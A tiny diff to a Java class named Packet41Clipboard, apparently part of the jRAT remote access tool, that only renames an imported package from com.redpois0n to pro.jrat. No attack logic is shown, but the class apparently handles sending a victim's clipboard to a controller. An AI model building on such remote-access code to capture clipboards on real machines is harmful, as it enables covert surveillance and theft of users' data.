@@ -4,7 +4,8 @@ import java.awt.Toolkit;
 import java.awt.datatransfer.DataFlavor;
 import java.io.DataOutputStream;
 
-import com.redpois0n.common.io.StringWriter;
+import pro.jrat.common.io.StringWriter;
+
 
 public class Packet41Clipboard extends AbstractOutgoingPacket {
 
